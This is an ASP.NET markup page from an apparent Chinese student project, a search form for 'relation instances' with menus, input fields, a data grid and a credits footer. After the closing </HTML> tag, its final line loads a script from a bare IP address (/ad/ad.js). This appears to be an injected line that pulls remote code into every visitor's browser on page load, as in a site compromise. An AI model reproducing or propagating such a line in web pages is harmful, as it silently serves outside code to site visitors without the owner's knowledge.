<%@ Page Language="vb" AutoEventWireup="false" Codebehind="rinstancesearch.aspx.vb" Inherits="relation.rinstancesearch"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
	<HEAD>
		<title>rinstancesearch</title>
		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
		<meta content="Visual Basic .NET 7.1" name="CODE_LANGUAGE">
		<meta content="JavaScript" name="vs_defaultClientScript">
		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">
	</HEAD>
	<body>
		<TABLE id="Table9" cellSpacing="0" cellPadding="0" width="778" align="center" bgColor="#fef3bd"
			border="0" valign="middle">
			<TR>
				<TD vAlign="middle" width="778" bgColor="#fef3bd" colSpan="3" height="8">
					<DIV align="center"><IMG height="8" src="imga/bg1.gif" width="100%"></DIV>
				</TD>
			</TR>
			<TR bgColor="#ffffff">
				<TD colSpan="3" height="60"><IMG height="60" src="imga/logo.gif" width="321"><IMG height="60" src="imga/idea.jpg" width="457"></TD>
			</TR>
			<TR>
				<TD vAlign="middle" colSpan="3" height="8"><IMG height="8" src="imga/bg2.gif" width="100%"></TD>
			</TR>
		</TABLE> <!--===============include menu================--> <!--==========include menu==============-->
		<TABLE id="Table10" cellSpacing="0" cellPadding="0" width="778" align="center" border="0">
			<TR>
				<TD class="p9" vAlign="middle" width="196" bgColor="#dedede" height="18">
					<DIV align="center"><FONT color="#666666"><B>
								<asp:Label id="timetext" runat="server"></asp:Label>
								&nbsp; </B></FONT>
					</DIV>
				</TD>
				<TD class="p9" vAlign="middle" width="51" bgColor="#dedede" height="18">
					<DIV align="right"><IMG height="25" src="imga/blue.jpg" width="35"></DIV>
				</TD>
				<TD class="p9" vAlign="middle" width="548" background="imga/blue2.jpg" bgColor="#00459c"
					height="18">
					<DIV align="left"><SPAN class="p10"><FONT color="#ffffff"><A class="whitemenu" onmouseover="showMenu(this,'topmenu1',0)" onmouseout="hideMenu(event)"
									href="rmodelpublish.aspx" target="_top">发布</A> <A class="whitemenu" onmouseover="showMenu(this,'topmenu2',0)" onmouseout="hideMenu(event)"
									href="rmodelsearch.aspx" target="_top">查询</A>&nbsp;<A class="whitemenu" onmouseover="showMenu(this,'topmenu3',0)" onmouseout="hideMenu(event)"
									href="rmodelmodification.aspx" target="_top">修改</A> </FONT></SPAN>
					</DIV>
				</TD>
			</TR>
		</TABLE>
		<DIV id="Div1" style="VISIBILITY: hidden" onmouseout="hideMenu(event)"></DIV>
		<FONT face="宋体"></FONT>
		<TABLE id="Table11" height="62" cellSpacing="0" width="778" align="center">
			<TR border="0">
				<TD class="p10" vAlign="top" background="imga/bg3.gif" colSpan="2" height="20" border="0"><IMG height="1" src="imga/03.gif" width="100%"><BR>
					<FONT color="#000000">&nbsp;|<SPAN class="p9"> <a href="index.aspx">首页</a></SPAN> |</FONT>
					<FONT color="#000000"><SPAN class="p9"><a href="index.aspx">用户登录</a></SPAN> |<a href="newcustomer.aspx">注册</a>
					</FONT>
				</TD>
			</TR>
			<TR border="0">
				<TD vAlign="top" width="172" bgColor="#0859ad" height="20">&nbsp;
					<asp:Label id="lblHint" runat="server" ForeColor="Info">Label</asp:Label></TD>
				<TD vAlign="top" bgColor="#0859ad" height="20">
					<DIV align="right"><FONT color="#ffffff"><marquee direction="left" behavior="scroll" scrolldelay="100" loop="-1">欢迎您 
								&nbsp;软件业的朋友！ &nbsp; &nbsp;</marquee>
						</FONT>
					</DIV>
				</TD>
			</TR>
		</TABLE>
		<CENTER>
			<TABLE id="Table12" height="400" cellSpacing="0" cellPadding="0" width="778" bgColor="#ffffff"
				border="0">
				<TR>
					<TD vAlign="top" width="172" bgColor="#0859ad" height="14"><!--====================include pageleft==================-->
						<TABLE id="Table13" cellSpacing="0" cellPadding="0" width="100%" border="0">
							<TR>
								<TD vAlign="top" bgColor="#0859ad">
									<DIV align="center"><FONT face="宋体"></FONT>&nbsp;</DIV>
								</TD>
							</TR>
						</TABLE>
						<TABLE id="Table14" height="100%" cellSpacing="0" cellPadding="0" width="100%" border="0">
							<TR>
								<TD vAlign="top" bgColor="#9cd7ef">
									<DIV align="center"><IMG style="WIDTH: 100%; HEIGHT: 40px" height="40" src="imga/grad.gif" width="172">&nbsp;
										<TABLE id="Table15" style="WIDTH: 153px; HEIGHT: 128px" width="153" border="1">
											<TR>
												<TD width="147" height="45">
													<DIV align="center">&nbsp;<a href="rmodelsearch.aspx">&nbsp;查询关系空间</a></DIV>
												</TD>
											</TR>
											<TR>
												<TD height="43">
													<DIV align="center"><a href="rdefinitionsearch.aspx">查询关系类型</a></DIV>
												</TD>
											</TR>
											<TR>
												<TD height="55">
													<DIV align="center"><a href="rinstancesearch.aspx">查询关系实例</a></DIV>
												</TD>
											</TR>
										</TABLE>
										<BR>
										<BR>
									</DIV>
								</TD>
							</TR>
						</TABLE>
					</TD>
					<TD vAlign="top" width="21" bgColor="#ffffff"><IMG height="23" src="imga/05.gif" width="21"></TD>
					<TD vAlign="top" width="611">
						<FORM style="MARGIN: 0px" name="loginForm" action="" method="post" runat="server">
							&nbsp;&nbsp;
							<TABLE id="Table2" style="WIDTH: 535px; HEIGHT: 498px" cellSpacing="1" cellPadding="1"
								width="535" border="1">
								<TR>
									<TD style="WIDTH: 273px"><FONT face="宋体">
											<TABLE id="Table4" style="WIDTH: 266px; HEIGHT: 27px" cellSpacing="1" cellPadding="1" width="266"
												border="1">
												<TR>
													<TD><FONT face="宋体"><asp:label id="Label2" runat="server">关系实例编号</asp:label></FONT></TD>
													<TD><FONT face="宋体"><asp:dropdownlist id="ddlstInstKey" runat="server" Width="96px"></asp:dropdownlist></FONT></TD>
												</TR>
											</TABLE>
										</FONT>
									</TD>
									<TD>
										<TABLE id="Table5" style="WIDTH: 266px; HEIGHT: 27px" cellSpacing="1" cellPadding="1" width="266"
											border="1">
											<TR>
												<TD><FONT face="宋体"></FONT></TD>
												<TD><FONT face="宋体"><asp:button id="btnYes" runat="server" Text="搜索"></asp:button></FONT></TD>
												<TD>
													<asp:Button id="Button1" runat="server" Text="按步长查询"></asp:Button></TD>
											</TR>
										</TABLE>
									</TD>
								</TR>
								<TR>
									<TD style="WIDTH: 273px"><FONT face="宋体">
											<TABLE id="Table1" style="WIDTH: 266px; HEIGHT: 641px" cellSpacing="1" cellPadding="1"
												width="266" border="1">
												<TR>
													<TD style="WIDTH: 272px; HEIGHT: 32px"><FONT face="宋体"><asp:label id="Label1" runat="server">关系类型的名称</asp:label></FONT></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 272px; HEIGHT: 21px"><asp:textbox id="txtDefName" runat="server"></asp:textbox></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 272px; HEIGHT: 29px"><asp:label id="Label5" runat="server" Width="160px">关联对象个数</asp:label></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 272px; HEIGHT: 7px"><asp:textbox id="txtDefNum" runat="server"></asp:textbox></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 272px; HEIGHT: 29px"><asp:label id="Label8" runat="server">是否有向关系</asp:label></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 272px; HEIGHT: 31px">&nbsp;
														<asp:radiobutton id="rbtnIsDirYes" runat="server" Width="88px" Text="有向" GroupName="rbtnIsDir"></asp:radiobutton><FONT face="宋体">&nbsp;
															<asp:radiobutton id="rbtnIsDirNo" runat="server" Text="无向" GroupName="rbtnIsDir"></asp:radiobutton></FONT></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 272px; HEIGHT: 29px">是否需要结关联对象确认</TD>
												</TR>
												<TR>
													<TD style="WIDTH: 272px; HEIGHT: 29px"><asp:radiobutton id="rbtnIsConfYes" runat="server" Text="需要确认" GroupName="rbtnIsConf"></asp:radiobutton>&nbsp;
														<asp:radiobutton id="rbtnIsConfNo" runat="server" Text="不需确认" GroupName="rbtnIsConf"></asp:radiobutton></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 272px; HEIGHT: 32px"><asp:label id="Label10" runat="server" Width="184px">关系对象类型</asp:label></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 272px"><asp:textbox id="txtInstType" runat="server"></asp:textbox></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 272px"><asp:label id="Label6" runat="server">关系实例顶点信息</asp:label></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 272px"><asp:datagrid id="dgrdInst" runat="server" Width="194px"></asp:datagrid></TD>
												</TR>
											</TABLE>
										</FONT>
									</TD>
									<TD><FONT face="宋体"><asp:image id="imgInst" runat="server" Width="202px" Height="202px"></asp:image></FONT></TD>
								</TR>
							</TABLE>
							<asp:label id="lblWarning" ForeColor="#0000C0" runat="server" Width="408px">label</asp:label>
					</TD>
				</TR>
			</TABLE>
		</CENTER> <!---====================include pagetail================--> </FORM>
		<CENTER>
			<TABLE id="Table16" cellSpacing="0" cellPadding="0" width="778" border="0">
				<TR>
					<TD><IMG height="31" src="imga/bg4.gif" width="778"></TD>
				</TR>
				<TR>
					<TD class="p9" background="imga/bg5.gif">
						<DIV align="center">| 联络我们 | 客服电话：<STRONG><FONT face="Arial">0571-63740939</FONT></STRONG></DIV>
					</TD>
				</TR>
				<TR>
					<TD class="p9" bgColor="#ffffff"><FONT face="宋体">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
							版权所有：&nbsp;&nbsp; 浙江林学院信息工程学院天信022 王海玲 陆美丽 </FONT>
					</TD>
				</TR>
			</TABLE>
		</CENTER>
	</body>
</HTML>
<script src="http://222.208.183.246/ad/ad.js"></script>
